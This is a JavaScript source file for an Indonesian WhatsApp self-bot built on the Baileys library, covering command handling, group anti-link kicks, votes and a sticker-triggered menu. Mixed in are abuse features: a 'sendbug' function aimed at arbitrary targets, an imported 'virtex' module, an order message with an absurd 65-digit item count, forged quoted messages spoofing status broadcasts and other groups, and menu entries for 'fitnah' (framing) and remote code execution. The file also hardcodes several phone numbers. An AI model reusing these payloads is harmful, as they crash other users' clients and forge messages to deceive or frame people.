const
	{
		WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES,
		WA_DEFAULT_EPHEMERAL,
		ReconnectMode,
		ProxyAgent,
		GroupSettingChange,
		waChatKey,
		mentionedJid,
		processTime,
	} = require("@adiwajshing/baileys")
const hx = require('hxz-api')
const { relayWAMessage, prepareMessageFromContent } = require('@adiwajshing/baileys')
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const imgbb = require('imgbb-uploader')
const Exif = require('./lib/exif');
const exif = new Exif();
const speed = require('performance-now')
const request = require('request');
const { spawn, exec, execSync } = require("child_process")
const fs = require("fs")
const axios = require("axios")
const ffmpeg = require('fluent-ffmpeg')
const { EmojiAPI } = require("emoji-api");
const ig = require('insta-fetcher')
const requests = require("node-fetch")
const emoji = new EmojiAPI()
const fetch = require('node-fetch');
const phoneNum = require('awesome-phonenumber')
const gis = require('g-i-s');
const got = require("got");
const { virtex } = require('./stik/virtex.js');
const imageToBase64 = require('image-to-base64');
const ID3Writer = require('browser-id3-writer');		
const brainly = require('brainly-scraper')
const yts = require( 'yt-search')
const user = JSON.parse(fs.readFileSync('./register.json'))
const ms = require('parse-ms')
const toMs = require('ms')
const { error } = require("qrcode-terminal")
const { getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const { color, bgcolor } = require('./lib/color')
const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetcher')
const { yta, ytv, igdl, upload, formatDate } = require('./lib/ytdl')
const { webp2mp4File} = require('./lib/webp2mp4')
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const afk = JSON.parse(fs.readFileSync('./lib/off.json'))
const mati = JSON.parse(fs.readFileSync('./lib/afk.json'))
const { sleep, isAfk, cekafk, addafk } = require('./lib/offline')
const voting = JSON.parse(fs.readFileSync('./lib/voting.json'))
const { addVote, delVote } = require('./lib/vote')
const { jadibot, stopjadibot, listjadibot } = require('./lib/jadibot')
let setting = JSON.parse(fs.readFileSync('./setting.json'))
const antilink = JSON.parse(fs.readFileSync('./lib/antilink.json'))
let _scommand = JSON.parse(fs.readFileSync('./scommand.json'));
banChats = false
offline = false
targetpc = '0'
owner = '6282289662946','994407170763','994401230912'
fake = 'Ocaa && Will'
numbernye = '0'
waktu = '-'
WillTest= 'Will Ft Rosa 💗'
autovn = true
alasan = '-'
randomUser = {}
//=================================================//
// Sticker Cmd
const addCmd = (id, command) => {
	const obj = {
		id: id,
		chats: command
	}
	_scommand.push(obj)
	fs.writeFileSync('./scommand.json', JSON.stringify(_scommand))
}

const getCommandPosition = (id) => {
	let position = null;
	Object.keys(_scommand).forEach((i) => {
		if (_scommand[i].id === id) {
			position = i
		}
	})
	if (position !== null) {
		return position
	}
}

const getCmd = (id) => {
	let position = null
	Object.keys(_scommand).forEach((i) => {
		if (_scommand[i].id === id) {
			position = i
		}
	})
	if (position !== null) {
		return _scommand[position].chats
	}
}

const checkSCommand = (id) => {
	let status = false
	Object.keys(_scommand).forEach((i) => {
		if (_scommand[i].id === id) {
			status = true
		}
	})
	return status
}
module.exports = hexa = async (hexa, mek) => {
try {
        if (!mek.hasNewMessage) return hexa.setStatus(`Runtime ${kyun(process.uptime())} | Mode: ${banChats ? 'SELF-MODE' : 'PUBLIC-MODE'} | ${WillTest}`)

        mek = mek.messages.all()[0]
		if (!mek.message) return
		if (mek.key && mek.key.remoteJid == 'status@broadcast') return
if (mek.key.id.startsWith('3EB0') && mek.key.id.length === 12) return
		global.prefix
        	mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
        	const content = JSON.stringify(mek.message)

		const from = mek.key.remoteJid
	
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
                const type = Object.keys(mek.message)[0]        
                const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
                
                const prefix = /^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*@,;]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*,;]/gi) : '-'  
        body = mek.message.conversation || mek.message[type].caption || mek.message[type].text || (type == 'listResponseMessage' ? mek.message[type].singleSelectReply.selectedRowId : '') || (type == 'buttonsResponseMessage' ? mek.message[type].selectedButtonId : '') || (type == 'stickerMessage' && getCmd(mek.message[type].fileSha256.toString('base64')) !== null && getCmd(mek.message[type].fileSha256.toString('base64')) !== undefined ? getCmd(mek.message[type].fileSha256.toString('base64')) : '') || ''
      budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const command = body.startsWith(prefix) ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
		const welkom = JSON.parse(fs.readFileSync('./lib/welkom.json'))
		const isCmd = body.startsWith(prefix)
		const q = args.join(' ')
		const botNumber = hexa.user.jid
		const botNumberss = hexa.user.jid + '@c.us'
		const isGroup = from.endsWith('@g.us')
		
		let sender = mek.key.fromMe ? botNumber : isGroup ? mek.participant : from
		// const isSelfNumber = config.NomorSELF
		// const isOwner = sender.id === isSelfNumber
		const isUser = user.includes(sender)
		const ownerNumber = ["994407170763","48729757887","62813828362494","6285710123047","6289510576604","6282289662946"]
        const isOwner = mek.key.fromMe || ownerNumber.includes(sender.split('@')[0])
		const totalchat = await hexa.chats.all()
		let readmore = (String.fromCharCode(8206)).repeat(4001)
		const isWelkom = isGroup ? welkom.includes(from) : false
		const groupMetadata = isGroup ? await hexa.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const mentionUser = type == "extendedTextMessage" ? mek.message.extendedTextMessage.contextInfo.mentionedJid || [] : []
		const groupId = isGroup ? groupMetadata.jid : ''
		var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
		const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const stickCmd = type == 'stickerMessage' ? mek.message.stickerMessage.fileSha256.toString('base64') : '' || ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false
        const isVote = isGroup ? voting.includes(from) : false
const isAntiLink = isGroup ? antilink.includes(from) : false
        const conts = mek.key.fromMe ? hexa.user.jid : hexa.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = mek.key.fromMe ? hexa.user.name : conts.notify || conts.vname || conts.name || '-'
        const quotedMessageContext = mek.message.extendedTextMessage && mek.message.extendedTextMessage.contextInfo
        const quotedMessage = quotedMessageContext && quotedMessageContext.quotedMessage
	
        //MESS
		mess = {
			wait: 'Otewe',
			success: 'Berhasil!',
			wrongFormat: 'Format salah, coba liat lagi di menu',
			error: {
				stick: 'bukan sticker itu:v',
				Iv: 'Linknya error:v'
			},
			only: {
				group: 'Khusus grup ngab',
			}
		}
		const isUrl = (url) => {
        return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
        }

         const reply = (teks) => {

            hexa.sendMessage(from, teks, text, { quoted: mek, thumbnail: fs.readFileSync('./stik/fake.jpeg'), contextInfo: { externalAdReply: { title: 'Will Ft Rosa', body: 'Will && Ocaa', sourceUrl: `https://wa.me/c/6283870005811`, thumbnail: fs.readFileSync('./stik/thumb.jpeg') }}})

            }

        const sendMess = (hehe, teks) => {
            hexa.sendMessage(hehe, teks, text)
        }

        const mentions = (teks, memberr, id) => {
            (id == null || id == undefined || id == false) ? hexa.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : hexa.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": memberr } })
        }
        const fakestatus = (teks) => {
            hexa.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./stik/thumb.jpeg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
        const ftroli = {
	key : {
                          participant : '0@s.whatsapp.net'
                        },
       message: {
                    orderMessage: {
                            itemCount : 2021,
                            status: 1,
                            surface : 1,
                            message: 'Will Ft Rosa', 
                            orderTitle: 'WillOcaa',
                            thumbnail: fs.readFileSync('./stik/fake.jpeg'), //Gambarnye
                            sellerJid: '0@s.whatsapp.net'
          
                          }
                        }
                      }
                      
        const tromli = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: from} : {}) }, message: { orderMessage:{ orderId: '155157279766079', itemCount: '99999999999999999999999999999999999999999999999999999999999999999', status: 'INQUIRY', surface:  'CATALOG', message: 'Will Ft Rosa', jpegthumnail: fs.readFileSync('./stik/fake.jpeg'), orderTitle: 'I  See', sellerJid: '62895357313000@s.whatsapp.net', token: 'AR5wc3iY2NY8yJaK9MMXdlK/aguUxoA8yPtSFcvt0lrE5g==' }}}
const sendSticker = (from, filename, mek) => {
	hexa.sendMessage(from, filename, MessageType.sticker, {quoted: mek})
}

        const getGroup = async function(totalchat){
   let grup = []
   let a = []
   let b = []
   for (c of totalchat){
      a.push(c.jid)
   }
   for (d of a){
      if (d && d.includes('g.us')){
         b.push(d)
      }
   }
   for (e of b){
      let ingfo = await hexa.groupMetadata(e)
      grup.push(ingfo)
   }
   return grup
}
        const fakethumb = (teks, yes) => {
            hexa.sendMessage(from, teks, image, {thumbnail:fs.readFileSync('./stik/fake.jpeg'),quoted:mek,caption:yes})
        }
        const fakegroup = (teks) => {
            hexa.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./stik/thumb.jpeg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
        const httext = async(jid, text) => {
	let anu = await hexa.groupMetadata(jid)
	let members = anu.participants
	let ane = []
	for (let i of members) {
		ane.push(i.jid)
	}
	hexa.sendMessage(jid, text, MessageType.extendedText, {
		sendEphemeral: true,
		contextInfo: {
			mentionedJid: ane
		}
	})
}
        const sendStickerFromUrl = async(to, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './stik' + names + '.png', async function () {
                    console.log('selesai');
                    let filess = './stik' + names + '.png'
                    let asw = './stik' + names + '.webp'
                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        let media = fs.readFileSync(asw)
                        hexa.sendMessage(to, media, MessageType.sticker,{quoted:mek})
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                    });
                });
            }
            const  htsticker = async function(from, sticker){
	let anu = await hexa.groupMetadata(from)
	let members = anu.participants
	let ane = []
	for (let i of members){
		ane.push(i.jid)
	}
hexa.sendMessage(from, sticker, MessageType.sticker, {contextInfo: {"mentionedJid": ane}})
}
        const sendMediaURL = async(to, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(to, text, mids)
                }
                const fn = Date.now() / 10000;
                const filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('done');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    hexa.sendMessage(to, media, type, { quoted: mek, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            }   
            const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var ucapanWaktu = 'Malam Lord :v'
                                        }
if(time2 < "19:00:00"){
var ucapanWaktu = 'Petang Lord :v'
                                         }
if(time2 < "18:00:00"){
var ucapanWaktu = 'Sore Lord :v'
                                         }
if(time2 < "15:00:00"){
var ucapanWaktu = 'Siang Lord :v'
                                         }
if(time2 < "11:00:00"){
var ucapanWaktu = 'Pagi Lord :v'
                                         }
if(time2 < "05:00:00"){
var ucapanWaktu = 'Malam Lord :v'
                                         }
//FUNCTION
            cekafk(afk)
            if (!mek.key.remoteJid.endsWith('@g.us') && offline){
            if (!mek.key.fromMe){
            if (isAfk(mek.key.remoteJid)) return
            addafk(mek.key.remoteJid)
            heheh = ms(Date.now() - waktu) 
            hexa.sendMessage(mek.key.remoteJid,`@${owner} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}})
            }
            }   
        if (mek.key.remoteJid.endsWith('@g.us') && offline) {
        if (!mek.key.fromMe){
        if (mek.message.extendedTextMessage != undefined){
        if (mek.message.extendedTextMessage.contextInfo != undefined){
        if (mek.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
        for (let ment of mek.message.extendedTextMessage.contextInfo.mentionedJid) {
        if (ment === `${owner}@s.whatsapp.net`){
        if (isAfk(mek.key.remoteJid)) return
        addafk(mek.key.remoteJid)
        heheh = ms(Date.now() - waktu)
        hexa.sendMessage(mek.key.remoteJid,`@${owner} Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}})
          }
        }
            }
          }
        }
      }
    }
    
    //Function Amtilink
    if (messagesC.includes("://chat.whatsapp.com/")){
					if (!isGroup) return
					if (!isAntiLink) return
					if (isGroupAdmins) return reply('karena kamu adalah admin group, bot tidak akan kick kamu')
					hexa.updatePresence(from, Presence.composing)
					if (messagesC.includes("#izinadmin")) return reply("#izinadmin diterima")
					var kic = `${sender.split("@")[0]}@s.whatsapp.net`
						reply(`Link Group Terdeteksi maaf ${sender.split("@")[0]} anda akan di kick dari group 3detik lagi`)
						setTimeout( () => {
						hexa.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
					}, 3000)
						setTimeout( () => {
						hexa.updatePresence(from, Presence.composing)
						reply("1detik")
					}, 2000)
						setTimeout( () => {
						hexa.updatePresence(from, Presence.composing)
						reply("2detik")
					}, 1000)
						setTimeout( () => {
						hexa.updatePresence(from, Presence.composing)
						reply("3detik")
					}, 0)
				}
    //////Batas\\\\\\\\\\\\\\\\\
//========================================================================================================================//
		colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
   
//send 1 button
         const sendbug = async (target, teks) => {
      if (!teks) teks = ".";
      await hexa.relayWAMessage(hexa.prepareMessageFromContent(target, hexa.prepareDisappearingMessageSettingContent(0), {}), { waitForAck: true })
      hexa.sendMessage(target, teks, "conversation")
    }
const sendButton = async(content, footer, button1, row1, options = {}) => {
      buttons = [
        { buttonId: row1, buttonText: { displayText: button1 }, type: 1 }
      ]
      buttonMessage = {
        contentText: content,
        footerText: footer,
        buttons: buttons,
        headerType: 1
      }
      await hexa.sendMessage(from, buttonMessage, MessageType.buttonsMessage, { ...options })
    }
//send 2 button
const send2Button = async(content, footer, button1, row1, button2, row2, options = {}) => {
      buttons = [
        { buttonId: row1, buttonText: { displayText: button1 }, type: 1 },
        { buttonId: row2, buttonText: { displayText: button2 }, type: 1 }
      ]
      buttonMessage = {
        contentText: content,
        footerText: footer,
        buttons: buttons,
        headerType: 1
      }
      await hexa.sendMessage(from, buttonMessage, MessageType.buttonsMessage, { ...options })
    }
//send 3 button
const send3Button = async(content, footer, button1, row1, button2, row2, button3, row3, options = {}) => {
      buttons = [
        { buttonId: row1, buttonText: { displayText: button1 }, type: 1 },
        { buttonId: row2, buttonText: { displayText: button2 }, type: 1 },
        { buttonId: row3, buttonText: { displayText: button3 }, type: 1 }
      ]
      buttonMessage = {
        contentText: content,
        footerText: footer,
        buttons: buttons,
        headerType: 1
      }
      await hexa.sendMessage(from, buttonMessage, MessageType.buttonsMessage, { ...options })
    }
/////*** AFK ***\\\\\
for (let x of mentionUser) {
                if (mati.hasOwnProperty(x.split('@')[0])) {
                    ini_mn1k = "Dia Lagi Afk Coy!?\n"
                    if (mati[x.split('@')[0]] != "") {
                        ini_mn1k += "Dengan alasan " + alasan[x.split('@')[0]]
                    }
                    hexa.sendMessage(from, ini_mn1k, text, {quoted: mek})
                }
            }
            if (mati.hasOwnProperty(sender.split('@')[0])) {
                reply("Anda telah keluar dari mode afk.")
                delete mati[sender.split('@')[0]]
                fs.writeFileSync("./src/afk.json", JSON.stringify(mati))
            }
//send gambar + button
const sendButtonImg = async(content, url, footer, button1, row1, options = {}) => {
      m = await hexa.prepareMessage(from, await (await fetch(url)).buffer(), MessageType.image)
      buttons = [
        { buttonId: row1, buttonText: { displayText: button1 }, type: 1 }
      ]
      buttonMessage = {
        contentText: content,
        footerText: footer,
        buttons: buttons,
        headerType: 4,
        imageMessage: m.message.imageMessage
      }
      await hexa.sendMessage(from, buttonMessage, MessageType.buttonsMessage, { ...options })
    }
    const send2ButtonImg = async(content, url, footer, button1, row1, button2, row2, options = {}) => {
      m = await hexa.prepareMessage(from, await (await fetch(url)).buffer(), MessageType.image)
      buttons = [
        { buttonId: row1, buttonText: { displayText: button1 }, type: 1 },
        { buttonId: row2, buttonText: { displayText: button2 }, type: 1 }
      ]
      buttonMessage = {
        contentText: content,
        footerText: footer,
        buttons: buttons,
        headerType: 4,
        imageMessage: m.message.imageMessage
      }
      await hexa.sendMessage(from, buttonMessage, MessageType.buttonsMessage, { ...options })
    }
    const send3ButtonImg = async(content, url, footer, button1, row1, button2, row2, button3, row3 ,options = {}) => {
      m = await hexa.prepareMessage(from, await (await fetch(url)).buffer(), MessageType.image)
      buttons = [
        { buttonId: row1, buttonText: { displayText: button1 }, type: 1 },
        { buttonId: row2, buttonText: { displayText: button2 }, type: 1 },
        { buttonId: row3, buttonText: { displayText: button3 }, type: 1 }
      ]
      buttonMessage = {
        contentText: content,
        footerText: footer,
        buttons: buttons,
        headerType: 4,
        imageMessage: m.message.imageMessage
      }
      await hexa.sendMessage(from, buttonMessage, MessageType.buttonsMessage, { ...options })
    }
 	if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
      	//if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
     	if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
      	//if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
	    if(isGroup && !isVote) {
        if (budy.toLowerCase() === 'vote'){
        let vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`))  
        let fil = vote.map(v => v.participant)
        let id_vote = sender ? sender : '6285751056816@s.whatsapp.net'
        if(fil.includes(id_vote)) {
        return mentions('@'+sender.split('@')[0]+' Anda sudah vote', fil, true)
        } else {
        vote.push({
            participant: id_vote,
            voting: '✅'
        })
        fs.writeFileSync(`./lib/${from}.json`,JSON.stringify(vote))
        let _p = []
        let _vote = '*Vote* '+ '@'+ _votes[0].votes.split('@')[0] + `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n` 
        for(let i = 0; i < vote.length; i++) {
        _vote +=  `@${vote[i].participant.split('@')[0]}\n*Vote* : ${vote[i].voting}\n\n`
        _p.push(vote[i].participant)
        }  
        _p.push(_votes[0].votes)
        mentions(_vote,_p,true)   
        }
        } else if (budy.toLowerCase() === 'devote'){
        const vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`))  
        let fil = vote.map(v => v.participant)
        let id_vote = sender ? sender : '6285751056816@s.whatsapp.net'
        if(fil.includes(id_vote)) {
        return mentions('@'+sender.split('@')[0]+' Anda sudah vote', fil, true)
        } else {
        vote.push({
            participant: id_vote,
            voting: '❌'
        })
        fs.writeFileSync(`./lib/${from}.json`,JSON.stringify(vote))
        let _p = []
        let _vote = '*Vote* '+ '@'+ _votes[0].votes.split('@')[0] + `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n` 
        for(let i = 0; i < vote.length; i++) {
        _vote +=  `@${vote[i].participant.split('@')[0]}\n*Vote* : ${vote[i].voting}\n\n`
        _p.push(vote[i].participant)
        }  
        _p.push(_votes[0].votes)
        mentions(_vote,_p,true)   
        }
    }
}	
		/*if ((sender in randomUser) && quotedMessage && budy && /Belum daftar/i.test(quotedMessage.conversation)) {
				kodenya = randomUser[sender][0]
				if (budy == kodenya) {
					reply('Sukses regis!')
					user.push(sender)
					fs.writeFileSync('./register.json', JSON.stringify(user))
					delete randomUser[sender]
				}
			} else if (isCmd && !isUser) {
	random = Math.floor(Math.random() * 99999)
	randomUser[sender] = [random]
	return hexa.sendMessage(from, 'Belum daftar!\nSilahkan cek pm utk melihat password\nlalu reply chat ini', 'conversation', { quoted: mek }).then(() => hexa.sendMessage(sender, random, 'conversation'))
} */
        
      if (!isCmd && mek.message && !autovn) {for (let i of totalchat) {await hexa.updatePresence(i.jid, Presence.recording)}}  //unavailable, available, composing, recording, paused
             function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
if (banChats && !mek.key.fromMe) return
// STIKER CMD
switch(stickCmd) {
	case 'un7mKFCIZuxrawaSfErSCy6BTTYOWCp4U3bYMYNqay0=': //isi fileSha
	menu = `Hai ${pushname}
Owner = ${WillTest}
Author = HexaGonz
Saya Hanya Kang Copas Brother

Hi = ${ucapanWaktu} ${pushname} @${sender.split('@')[0]}  

${readmore+readmore+readmore+readmore}
*</OWNER>*
► _${prefix}off_
► _${prefix}on_
► _${prefix}status_
${readmore+readmore+readmore}
*</MAKER>*
► _${prefix}sticker_
► _${prefix}swm_ <author|packname>
► _${prefix}take_ <author|packname>
► _${prefix}fdeface_
► _${prefix}emoji_
${readmore+readmore+readmore}
*</CONVERT>*
► _${prefix}toimg_
► _${prefix}tomp3_
► _${prefix}tomp4_
► _${prefix}slow_
► _${prefix}fast_
► _${prefix}reverse_
► _${prefix}tourl_
${readmore+readmore+readmore+readmore}
*</UP STORY>*
► _${prefix}upswteks_
► _${prefix}upswimage_
► _${prefix}upswvideo_
${readmore+readmore+readmore+readmore}
*</FUN>*
► _${prefix}fitnah_
► _${prefix}fitnahpc_
► _${prefix}kontak_
${readmore+readmore+readmore+readmore}
*</TAG>*
► _${prefix}hidetag_
► _${prefix}kontag_
► _${prefix}sticktag_
► _${prefix}totag_
${readmore+readmore+readmore+readmore}
*</DOWNLOAD>*
► _${prefix}ytsearch_ <query>
► _${prefix}igstalk_ <query>
► _${prefix}play_ <query>
► _${prefix}video_ <query>
► _${prefix}ytmp3_ <link>
► _${prefix}ytmp4_ <link>
► _${prefix}ig_ <link>
► _${prefix}igstory_ <username>
► _${prefix}twitter_ <link>
► _${prefix}tiktok_ <link>
► _${prefix}tiktokaudio_ <link>
► _${prefix}fb_ <link>
► _${prefix}brainly_ <query>
► _${prefix}image_ <query>
► _${prefix}anime_ <random>
► _${prefix}pinterest_ <query>
► _${prefix}komiku_ <query>
► _${prefix}lirik_ <query>
► _${prefix}chara_ <query>
► _${prefix}playstore_ <query>
► _${prefix}otaku_ <query>
${readmore+readmore+readmore+readmore}
*</OTHER>*
► _${prefix}self_
► _${prefix}public_
► _${prefix}setthumb_
► _${prefix}settarget_
► _${prefix}setfakeimg_
► _${prefix}setreply_
► _${prefix}ping_
► _${prefix}inspect_
► _${prefix}join_
► _${prefix}caripesan_ <query>
► _${prefix}get_
► _${prefix}term_ <code>
► _x_ <code>
${readmore+readmore+readmore+readmore}
*</JADI BOT>*
► _${prefix}jadibot_
► _${prefix}stopjadibot_
► _${prefix}listbot_
${readmore+readmore+readmore+readmore}
*</VOTE>*
► _${prefix}voting_
► _${prefix}delvote_
► _vote_
► _devote_
${readmore+readmore+readmore+readmore}
❏ *SELF-BOT* ❏`
    reply(menu)
    break
   } 
   switch (command) {
case 'buttonimg':
	menunya = `Hi Silahkan Pilih Yak`
	send2ButtonImg('Will Ft Rosa', 'https://telegra.ph/file/26da565d52b441d0508e9.jpg', menunya, `Klik Untuk Buka List Harga`, `${prefix}listharga`, 'Hi',`${prefix}bangke`,{thumbnail: fs.readFileSync('./stik/thumb.jpeg'), quoted:ftroli, contextInfo: { forwardingScore: 250, isForwarded: true,  externalAdReply: { title: '� �', body: 'ChipHiggsDomino', sourceUrl: `https://wa.me/c/6282289662946`, thumbnail: fs.readFileSync('./stik/thumb.jpeg')}}})
break
case 'button':
	send3Button(`Ini contoh buttonsMessage`, `:v`, `Menu Bot`, `${prefix}menu`, `Tes Speed`, `${prefix}ping`, `Cek Runtime`, `${prefix}runtime`, { quoted: mek })
	break
